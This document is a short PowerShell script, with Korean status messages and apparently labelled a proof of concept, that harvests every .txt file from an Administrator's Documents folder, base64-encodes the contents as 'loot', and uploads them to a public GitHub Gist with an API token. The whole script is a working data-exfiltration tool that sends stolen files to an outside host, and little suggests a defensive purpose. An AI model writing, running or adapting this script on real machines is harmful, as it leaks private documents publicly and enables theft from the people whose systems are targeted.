$token = "__TOKEN__"
$docPath = 'C:\Users\Administrator\Documents'
$outPath = 'C:\Windows\Temp\loot_b64.txt'
$logPath = 'C:\Windows\Temp\upload_success.log'

Write-Host "[*] 문서(.txt) 파일 수집 시작..."

try {
    $txtFiles = Get-ChildItem -Path $docPath -Filter *.txt | ForEach-Object {
        "`n----- $($_.Name) -----`n" + (Get-Content $_.FullName -Raw)
    }
    $allText = $txtFiles -join "`n"

    if (-not [string]::IsNullOrWhiteSpace($allText)) {
        Write-Host "[+] 문서 내용 수집 완료. Base64 인코딩 중..."
        $b64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($allText))
        Set-Content -Path $outPath -Value $b64
        Write-Host "[+] Base64 인코딩 결과 저장 완료: $outPath"

        Write-Host "[*] GitHub Gist 업로드 준비 중..."
        $body = @{
            description = 'POC 자동 업로드'
            public      = $true
            files       = @{
                'loot_b64.txt' = @{
                    content = $b64
                }
            }
        } | ConvertTo-Json -Depth 10

        Write-Host "[*] GitHub Gist 업로드 요청 전송 중..."
        $response = Invoke-RestMethod -Uri 'https://api.github.com/gists' -Method Post -Body $body -Headers @{
            Authorization = "Bearer $token"
            "User-Agent"  = "AutoUploadScript"
        }

        Add-Content -Path $logPath -Value "[+] Upload Success: $($response.html_url)"
        Write-Host "[+] GitHub Gist 업로드 성공: $($response.html_url)"
    }
    else {
        Write-Host "[!] 수집할 .txt 파일이 없습니다. 업로드 생략."
    }
}
catch {
    Add-Content -Path $logPath -Value "[!] Upload Failed: $_"
    Write-Host "[!] GitHub Gist 업로드 실패: $_"
}

Write-Host "[*] upload_gist.ps1 작업 완료."
